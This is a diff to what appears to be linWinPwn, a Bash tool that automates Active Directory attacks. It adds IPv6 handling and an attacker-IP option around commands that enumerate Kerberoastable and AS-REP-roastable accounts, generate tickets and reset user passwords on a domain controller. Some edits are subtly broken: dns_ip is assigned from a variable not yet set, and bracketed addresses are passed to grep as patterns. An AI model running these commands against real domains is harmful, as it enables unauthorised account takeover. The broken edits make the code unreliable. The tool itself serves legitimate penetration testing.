@@ -22,7 +22,22 @@ if ! stat "${pass_wordlist}" >/dev/null 2>&1; then pass_wordlist="${wordlists_di
 user_wordlist="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
 if ! stat "${user_wordlist}" >/dev/null 2>&1; then user_wordlist="${wordlists_dir}/cirt-default-usernames.txt"; fi
 attacker_interface="eth0"
-attacker_IP=$(ip -f inet addr show ${attacker_interface} 2>/dev/null | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
+attacker_IPv4=$(ip -f inet addr show "${attacker_interface}" 2>/dev/null | sed -En -e 's/.*inet ([0-9.]+).*/\1/p' | head -1)
+attacker_IPv6=$(ip -f inet6 addr show "${attacker_interface}" 2>/dev/null | sed -En -e 's/.*inet6 ([0-9a-fA-F:]+).*/\1/p' | grep -vi '^fe80' | head -1)
+attacker_IP="${attacker_IPv4:-$attacker_IPv6}"
+
+is_valid_ip() {
+    local ip="$1"
+    [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] && return 0
+    [[ "$ip" =~ ^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$ ]] && return 0
+    return 1
+}
+
+bracket_ip() {
+    local ip="$1"
+    if [[ "$ip" == *:* ]]; then echo "[$ip]"; else echo "$ip"; fi
+}
+attacker_IP_bracket=$(bracket_ip "$attacker_IP")
 targets="DC"
 ldap_port="389"
 nullsess_bool=false
@@ -201,6 +216,7 @@ help_linWinPwn() {
     echo -e "--offline           Skip connection and authentication checks"
     echo -e "--verbose           Enable all verbose and debug outputs"
     echo -e "-I/--interface      Attacker's network interface (default: eth0)"
+    echo -e "-a/--attacker-ip    Attacker's IP address (overrides auto-detection; IPv4 or IPv6)"
     echo -e "-T/--targets        Target systems for Vuln Scan, SMB Scan, Network Scan and Pwd Dump (Interactive mode default = DC, Auto mode default = All)"
     echo -e "     ${CYAN}Choose between:${NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)"
     echo -e "-U/--userwordlist   Custom username list used during Null session checks"
@@ -217,7 +233,7 @@ while test $# -gt 0; do
     case $1 in
     -t | --target)
         dc_ip="${2}"
-        dns_ip=${dc_ip}
+        dns_ip=${dc_ip_bracket}
         shift
         ;; #mandatory
     -d | --domain)
@@ -271,8 +287,27 @@ while test $# -gt 0; do
         args+=("$1")
         ;; #auto mode, disable interactive
     -I | --interface)
-        attacker_IP="$(ip -f inet addr show "${2}" | sed -En 's/.*inet ([0-9.]+).*/\1/p')"
         attacker_interface="${2}"
+        attacker_IPv4="$(ip -f inet addr show "${2}" 2>/dev/null | sed -En 's/.*inet ([0-9.]+).*/\1/p' | head -1)"
+        attacker_IPv6="$(ip -f inet6 addr show "${2}" 2>/dev/null | sed -En 's/.*inet6 ([0-9a-fA-F:]+).*/\1/p' | grep -vi '^fe80' | head -1)"
+        attacker_IP="${attacker_IPv4:-$attacker_IPv6}"
+        attacker_IP_bracket=$(bracket_ip "$attacker_IP")
+        shift
+        ;;
+    -a | --attacker-ip)
+        attacker_IP="${2}"
+        if ! is_valid_ip "$attacker_IP"; then
+            echo -e "${RED}[-] Invalid attacker IP: ${attacker_IP}${NC}" >&2
+            exit 1
+        fi
+        if [[ "$attacker_IP" == *:* ]]; then
+            attacker_IPv6="$attacker_IP"
+            attacker_IPv4=""
+        else
+            attacker_IPv4="$attacker_IP"
+            attacker_IPv6=""
+        fi
+        attacker_IP_bracket=$(bracket_ip "$attacker_IP")
         shift
         ;;
     -T | --targets)
@@ -336,6 +371,7 @@ while test $# -gt 0; do
         offline_bool=true
         noexec_bool=true
         dc_ip="127.0.0.1"
+        dc_ip_bracket="127.0.0.1"
         dns_ip="127.0.0.1"
         dc_domain="domain.local"
         dc_NETBIOS="dc"
@@ -406,19 +442,19 @@ check_tool_status() {
 ntp_update() {
     echo -e ""
     sudo timedatectl set-ntp 0
-    sudo ntpdate "${dc_ip}"
+    sudo ntpdate "${dc_ip_bracket}"
     echo -e "${GREEN}[+] NTP sync complete${NC}"
 }
 
 etc_hosts_update() {
     echo -e ""
-    if ! grep -q "${dc_ip}" "/etc/hosts" >/dev/null 2>&1; then
+    if ! grep -q "${dc_ip_bracket}" "/etc/hosts" >/dev/null 2>&1; then
         hosts_bak="${Config_dir}/hosts.$(date +%Y%m%d%H%M%S).backup"
         sudo cp /etc/hosts "${hosts_bak}"
         echo -e "${YELLOW}[i] Backup file of /etc/hosts created: ${hosts_bak}${NC}"
         sudo sed -i "/${dc_FQDN}/d" /etc/hosts
         echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
-        echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
+        echo -e "${dc_ip_bracket}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
         echo -e "${GREEN}[+] Hosts file update complete${NC}"
     else
         echo -e "${PURPLE}[-] Target IP already present in /etc/hosts... ${NC}"
@@ -498,7 +534,7 @@ prepare() {
         fi
         echo -e "${YELLOW}[i]${NC} Use -h for more help"
         exit 1
-    elif [[ ! $dc_ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+    elif ! is_valid_ip "$dc_ip"; then
         echo -e "${RED}[-] Target is not an IP address... ${NC}"
         dig_ip=$(dig +short "${dc_ip}")
         if [ -n "$dig_ip" ]; then echo -e "${YELLOW}[i]${NC} Provided target resolves to ${dig_ip}!${NC}"; fi
@@ -511,23 +547,25 @@ prepare() {
         exit 1
     fi
 
+    dc_ip_bracket=$(bracket_ip "$dc_ip")
+
     echo -e "${GREEN}[+] $(date)${NC}"
 
     if ! stat "${netexec}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please ensure netexec is installed and try again... ${NC}"
         exit 1
     elif [ "${offline_bool}" == "false" ]; then
-        dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "\[-\]\|Connection refused\|Initializing\|nxc.conf")
+        dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip_bracket}" | grep -v "\[-\]\|Connection refused\|Initializing\|nxc.conf")
         if [[ $dc_info == *"First time use detected"* ]]; then
-            dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "\[-\]\|Connection refused\|Initializing\|nxc.conf")
+            dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip_bracket}" | grep -v "\[-\]\|Connection refused\|Initializing\|nxc.conf")
         fi
         if [ -z "$dc_info" ]; then
             echo -e "${PURPLE}[!] Error connecting to LDAP! Please ensure the LDAP port is correct and accessible (--ldaps, --ldap-port 3268). Using SMB only ... ${NC}"
-            dc_info=$(${netexec} smb "${dc_ip}" | grep -v "Connection refused\|Initializing\|nxc.conf")
+            dc_info=$(${netexec} smb "${dc_ip_bracket}" | grep -v "Connection refused\|Initializing\|nxc.conf")
         fi
         if [ -z "$dc_info" ]; then
             echo -e "${PURPLE}[!] Error connecting to SMB! Please ensure the SMB port is correct and accessible. Attempting to use MSSQL ... ${NC}"
-            dc_info=$(${netexec} mssql "${dc_ip}" | grep -v "Connection refused\|Initializing\|nxc.conf")
+            dc_info=$(${netexec} mssql "${dc_ip_bracket}" | grep -v "Connection refused\|Initializing\|nxc.conf")
         fi
         if [ -z "$dc_info" ]; then
             echo -e "${PURPLE}[!] Error connecting to MSSQL! Please ensure the MSSQL port is correct and accessible.${NC}"
@@ -552,7 +590,7 @@ prepare() {
             ldaps_bool=true
         elif [[ $dc_info == *"channel binding:Unknown"* ]]; then
             # Query LDAPS to get accurate channel binding status
-            dc_info_ldaps=$(${netexec} ldap --port 636 "${dc_ip}" 2>/dev/null | grep -v "\[-\]\|Connection refused")
+            dc_info_ldaps=$(${netexec} ldap --port 636 "${dc_ip_bracket}" 2>/dev/null | grep -v "\[-\]\|Connection refused")
             if [[ $dc_info_ldaps == *"channel binding:Always"* ]] || [[ $dc_info_ldaps == *"channel binding:True"* ]]; then
                 ldapbind_bool=true
                 ldaps_bool=true
@@ -595,7 +633,7 @@ prepare() {
     sql_hostname_list="${Servers_dir}/sql_list_${dc_domain}.txt"
     custom_servers_list="${Servers_dir}/custom_servers_list_${dc_domain}.txt"
     users_list="${Users_dir}/users_list_${dc_domain}.txt"
-    if [ "${useip_bool}" == true ]; then target="${dc_ip}"; else target="${dc_FQDN}"; fi
+    if [ "${useip_bool}" == true ]; then target="${dc_ip_bracket}"; else target="${dc_FQDN}"; fi
     if [ "${useip_bool}" == true ]; then target_dc="${dc_ip_list}"; else target_dc="${dc_hostname_list}"; fi
     if [ "${useip_bool}" == true ]; then target_servers="${servers_ip_list}"; else target_servers="${servers_hostname_list}"; fi
     if [ "${useip_bool}" == true ]; then target_sql="${sql_ip_list}"; else target_sql="${sql_hostname_list}"; fi
@@ -622,10 +660,10 @@ prepare() {
     mkdir -p "${Scans_dir}"
 
     if [ "${offline_bool}" == "false" ]; then
-        if ! stat "${Scans_dir}/${dc_ip}_mainports.txt" >/dev/null 2>&1; then
-            ${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 "${dc_ip}" -sT -T5 --open > "${Scans_dir}/${dc_ip}"_mainports.txt;
+        if ! stat "${Scans_dir}/${dc_ip_bracket}_mainports.txt" >/dev/null 2>&1; then
+            ${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 "${dc_ip_bracket}" -sT -T5 --open > "${Scans_dir}/${dc_ip_bracket}"_mainports.txt;
         fi
-        dc_open_ports=$(/bin/cat "${Scans_dir}/${dc_ip}"_mainports.txt 2>/dev/null)
+        dc_open_ports=$(/bin/cat "${Scans_dir}/${dc_ip_bracket}"_mainports.txt 2>/dev/null)
     fi
     if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
     if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
@@ -1008,7 +1046,7 @@ authenticate() {
                     run_command "${netexec} ${ne_verbose} smb ${dc_FQDN} ${argument_ne} -k --kdcHost ${dc_FQDN} --generate-tgt ${krb_ticket} --log ${Credentials_dir}/getTGT_output_${user_var}.txt"
                     if stat "${krb_ticket}.ccache" >/dev/null 2>&1; then
                         echo -e "${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket.ccache'"
-                        echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -K '${krb_ticket}.ccache'"
+                        echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn -t ${dc_ip_bracket} -d ${domain} -u '${user}' -K '${krb_ticket}.ccache'"
                         exit 1
                     else
                         echo -e "${RED}[-] Failed to generate TGT${NC}"
@@ -1029,7 +1067,7 @@ authenticate() {
                         read -rp ">> " pass_passchange </dev/tty
                         if [[ ${pass_passchange} == "" ]]; then pass_passchange="Summer3000_"; fi
                         echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
-                        run_command "${impacket_changepasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange}" | tee -a "${Modification_dir}/impacket_changepasswd_${user_var}.txt"
+                        run_command "${impacket_changepasswd} ${argument_imp}\\@${dc_ip_bracket} -newpass ${pass_passchange}" | tee -a "${Modification_dir}/impacket_changepasswd_${user_var}.txt"
                     elif [[ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]]; then
                         echo -e "${BLUE}[*] Changing password of pre created computer account. Please specify new password (default: Summer3000_):${NC}"
                         read -rp ">> " pass_passchange </dev/tty
@@ -1050,7 +1088,7 @@ authenticate() {
                             read -rp ">> " authpass_passchange </dev/tty
                         done
                         echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
-                        run_command "${impacket_changepasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange} -altuser ${authuser_passchange} -altpass ${authpass_passchange}" | tee -a "${Modification_dir}/impacket_changepasswd_${user_var}.txt"
+                        run_command "${impacket_changepasswd} ${argument_imp}\\@${dc_ip_bracket} -newpass ${pass_passchange} -altuser ${authuser_passchange} -altpass ${authpass_passchange}" | tee -a "${Modification_dir}/impacket_changepasswd_${user_var}.txt"
                     fi
                     password="${pass_passchange}"
                     auth_check=""
@@ -1112,8 +1150,8 @@ parse_servers() {
     cat "${Servers_dir}"/servers_ip_list_*_*".txt" 2>/dev/null | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | awk 'NF' | sort -uf > "${servers_ip_list}"
     cat "${Servers_dir}"/dc_ip_list_*_*".txt" 2>/dev/null | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | awk 'NF' | sort -uf > "${dc_ip_list}"
 
-    if ! grep -q "${dc_ip}" "${servers_ip_list}" 2>/dev/null; then echo "${dc_ip}" >>"${servers_ip_list}"; fi
-    if ! grep -q "${dc_ip}" "${dc_ip_list}" 2>/dev/null; then echo "${dc_ip}" >>"${dc_ip_list}"; fi
+    if ! grep -q "${dc_ip_bracket}" "${servers_ip_list}" 2>/dev/null; then echo "${dc_ip_bracket}" >>"${servers_ip_list}"; fi
+    if ! grep -q "${dc_ip_bracket}" "${dc_ip_list}" 2>/dev/null; then echo "${dc_ip_bracket}" >>"${dc_ip_list}"; fi
     if ! grep -qi "${dc_FQDN^^}" "${dc_hostname_list}" 2>/dev/null; then echo "${dc_FQDN^^}" >>"${dc_hostname_list}"; fi
     if ! grep -qi "${dc_FQDN^^}" "${servers_hostname_list}" 2>/dev/null; then echo "${dc_FQDN^^}" >>"${servers_hostname_list}"; fi
 }
@@ -1373,7 +1411,7 @@ ldapdomaindump_enum() {
         else
             if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--ldap-channel-binding"; else ldapbind_param=""; fi
             if [ "${ldaps_bool}" == true ]; then ldaps_param="${ldapbind_param} ldaps"; else ldaps_param="ldap"; fi
-            run_command "${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip}:${ldap_port} -o ${DomainRecon_dir}/LDAPDomainDump" | tee "${DomainRecon_dir}/LDAPDomainDump/ldd_output_${dc_domain}.txt"
+            run_command "${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip_bracket}:${ldap_port} -o ${DomainRecon_dir}/LDAPDomainDump" | tee "${DomainRecon_dir}/LDAPDomainDump/ldd_output_${dc_domain}.txt"
         fi
         if [ -s "${DomainRecon_dir}/LDAPDomainDump/domain_users.json" ]; then
             /usr/bin/jq -r ".[].attributes.sAMAccountName[]" "${DomainRecon_dir}/LDAPDomainDump/domain_users.json" 2>/dev/null > "${Users_dir}/users_list_ldd_${dc_domain}.txt"
@@ -1494,7 +1532,7 @@ deleg_enum() {
         echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
     else
         echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
-        run_command "${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} -dc-host ${dc_NETBIOS}" | tee "${DomainRecon_dir}/impacket_findDelegation_output_${dc_domain}.txt"
+        run_command "${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip_bracket} -target-domain ${dc_domain} -dc-host ${dc_NETBIOS}" | tee "${DomainRecon_dir}/impacket_findDelegation_output_${dc_domain}.txt"
         if grep -q 'error' "${DomainRecon_dir}/impacket_findDelegation_output_${dc_domain}.txt"; then
             echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
         fi
@@ -1524,29 +1562,29 @@ bloodyad_all_enum() {
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             domain_DN=$(fqdn_to_ldap_dn "${dc_domain}")
             echo -e "${CYAN}[*] Searching for attribute msDS-Behavior-Version${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr msDS-Behavior-Version" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_forestlevel_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} get object ${domain_DN} --attr msDS-Behavior-Version" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_forestlevel_${dc_domain}.txt"
             echo -e "${CYAN}[*] Searching for attribute ms-DS-MachineAccountQuota${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr ms-DS-MachineAccountQuota" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_maq_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} get object ${domain_DN} --attr ms-DS-MachineAccountQuota" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_maq_${dc_domain}.txt"
             echo -e "${CYAN}[*] Searching for attribute minPwdLength${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr minPwdLength" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_minpasslen_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} get object ${domain_DN} --attr minPwdLength" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_minpasslen_${dc_domain}.txt"
             echo -e "${CYAN}[*] Searching for users${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype useronly" >"${DomainRecon_dir}/bloodyAD/bloodyad_allusers_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} get children --otype useronly" >"${DomainRecon_dir}/bloodyAD/bloodyad_allusers_${dc_domain}.txt"
             if [ -s "${DomainRecon_dir}/bloodyAD/bloodyad_allusers_${dc_domain}.txt" ]; then
                 cut -d ',' -f 1 "${DomainRecon_dir}/bloodyAD/bloodyad_allusers_${dc_domain}.txt" | cut -d '=' -f 2 | sort -u >"${Users_dir}/users_list_bla_${dc_domain}.txt"
             fi
             parse_users
             echo -e "${CYAN}[*] Searching for computers${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype computer" >"${DomainRecon_dir}/bloodyAD/bloodyad_allcomp_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} get children --otype computer" >"${DomainRecon_dir}/bloodyAD/bloodyad_allcomp_${dc_domain}.txt"
             if [ -s "${DomainRecon_dir}/bloodyAD/bloodyad_allcomp_${dc_domain}.txt" ]; then
                 cut -d "," -f 1 "${DomainRecon_dir}/bloodyAD/bloodyad_allcomp_${dc_domain}.txt" | cut -d "=" -f 2 | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" >"${Servers_dir}/servers_list_bla_${dc_domain}.txt"
             fi
             parse_servers
             echo -e "${CYAN}[*] Searching for containers${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype container" >"${DomainRecon_dir}/bloodyAD/bloodyad_allcontainers_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} get children --otype container" >"${DomainRecon_dir}/bloodyAD/bloodyad_allcontainers_${dc_domain}.txt"
             echo -e "${CYAN}[*] Searching for Kerberoastable${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee "${DomainRecon_dir}/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee "${DomainRecon_dir}/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt"
             echo -e "${CYAN}[*] Searching for ASREPRoastable${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_asreproast_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_asreproast_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -1562,7 +1600,7 @@ bloodyad_write_enum() {
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get writable" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_writable_${user_out}_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} get writable" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_writable_${user_out}_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -1578,7 +1616,7 @@ bloodyad_write_enum_details() {
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get writable --detail" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_writable_details_${user_out}_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} get writable --detail" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_writable_details_${user_out}_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -1594,7 +1632,7 @@ bloodyad_dnsquery() {
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} get dnsDump" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} --dns ${dns_ip} get dnsDump" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt"
             echo -e "${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}"
             sed -n '/[^\n]*\*/,/^$/p' "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt"
             grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt" > "${Servers_dir}/servers_ip_list_bloodyad_${dc_domain}.txt"
@@ -1621,7 +1659,7 @@ bloodyad_enum_object() {
                 echo -e "${RED}Invalid name.${NC} Please specify object:"
                 read -rp ">> " obj_enum </dev/tty
             done
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object '${obj_enum}'" 2>&1 | tee -a "${DomainRecon_dir}/bloodyAD/bloodyad_out_${obj_enum}_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} get object '${obj_enum}'" 2>&1 | tee -a "${DomainRecon_dir}/bloodyAD/bloodyad_out_${obj_enum}_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -1647,7 +1685,7 @@ silenthound_enum() {
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/SilentHound" || exit
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
-            run_command "${python3} ${silenthound} ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${DomainRecon_dir}/SilentHound/${dc_domain}" >"${DomainRecon_dir}/SilentHound/silenthound_output_${dc_domain}.txt"
+            run_command "${python3} ${silenthound} ${argument_silenthd} ${dc_ip_bracket} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${DomainRecon_dir}/SilentHound/${dc_domain}" >"${DomainRecon_dir}/SilentHound/silenthound_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
             if [ -s "${DomainRecon_dir}/SilentHound/${dc_domain}-hosts.txt" ]; then
                 cut -d " " -f 1 "${DomainRecon_dir}/SilentHound/${dc_domain}-hosts.txt" | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" >"${Servers_dir}/servers_list_shd_${dc_domain}.txt"
@@ -1709,13 +1747,13 @@ windapsearch_enum() {
             echo -e "${PURPLE}[-] windapsearch does not support Kerberos authentication${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--secure"; else ldaps_param=""; fi
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m users --full" >"${DomainRecon_dir}/windapsearch/windapsearch_users_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m computers --full" >"${DomainRecon_dir}/windapsearch/windapsearch_servers_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m groups --full" >"${DomainRecon_dir}/windapsearch/windapsearch_groups_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m privileged-users --full" >"${DomainRecon_dir}/windapsearch/windapsearch_privusers_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=*))'" >"${DomainRecon_dir}/windapsearch/windapsearch_spn_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m custom --filter '(objectCategory=user)(objectClass=user)(distinguishedName=%managedBy%)'" >"${DomainRecon_dir}/windapsearch/windapsearch_managedby_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName | grep dNSHostName | cut -d ' ' -f 2 | sort -u" >"${Servers_dir}/sql_list_windap_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip_bracket} --port ${ldap_port} ${ldaps_param} -m users --full" >"${DomainRecon_dir}/windapsearch/windapsearch_users_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip_bracket} --port ${ldap_port} ${ldaps_param} -m computers --full" >"${DomainRecon_dir}/windapsearch/windapsearch_servers_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip_bracket} --port ${ldap_port} ${ldaps_param} -m groups --full" >"${DomainRecon_dir}/windapsearch/windapsearch_groups_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip_bracket} --port ${ldap_port} ${ldaps_param} -m privileged-users --full" >"${DomainRecon_dir}/windapsearch/windapsearch_privusers_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip_bracket} --port ${ldap_port} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=*))'" >"${DomainRecon_dir}/windapsearch/windapsearch_spn_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip_bracket} --port ${ldap_port} ${ldaps_param} -m custom --filter '(objectCategory=user)(objectClass=user)(distinguishedName=%managedBy%)'" >"${DomainRecon_dir}/windapsearch/windapsearch_managedby_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip_bracket} --port ${ldap_port} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName | grep dNSHostName | cut -d ' ' -f 2 | sort -u" >"${Servers_dir}/sql_list_windap_${dc_domain}.txt"
             #Parsing user and computer lists
